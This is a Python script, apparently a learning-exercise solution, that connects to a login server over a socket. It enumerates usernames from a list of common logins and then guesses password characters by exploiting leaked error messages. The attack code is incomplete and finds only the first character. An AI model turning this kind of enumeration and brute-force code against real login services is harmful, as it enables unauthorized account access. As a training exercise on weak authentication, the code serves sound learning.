import sys
import socket
import itertools
import json
import string

host = sys.argv[1]
port = int(sys.argv[2])

common_logins = [
    login.rstrip() for login in
    list(open("F:/code/Password Hacker/Password Hacker/task/hacking/logins.txt").readlines())]

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

client_socket = socket.socket()
address = (host, port)

state = False

client_socket.connect(address)


def get_login():
    print("finding login...")
    # For every login in the list, send to server as json data with empty password. When response is Wrong Password!
    # return that login.
    try:
        for login in common_logins:
            data = json.dumps({
                "login": login,
                "password": " "
            })
            client_socket.send(data.encode())
            response = json.loads(client_socket.recv(
                1024).decode(encoding='utf-8'))
            if response == {"result": "Wrong password!"}:
                print("login is: " + login)
                return login
    except Exception:
        print("Exception occurred")


def get_password(login):
    print("finding password...")
    for character in characters:
        try:
            data = json.dumps({
                "login": login,
                "password": character
            })
            client_socket.send(data.encode())
            response = json.loads(client_socket.recv(
                1024).decode(encoding='utf-8'))
            if response.get('result') == 'Exception happened during login':
                print("first character is: " + character)
        except Exception as e:
            print(e)


user_login = get_login()
get_password(user_login)

client_socket.close()
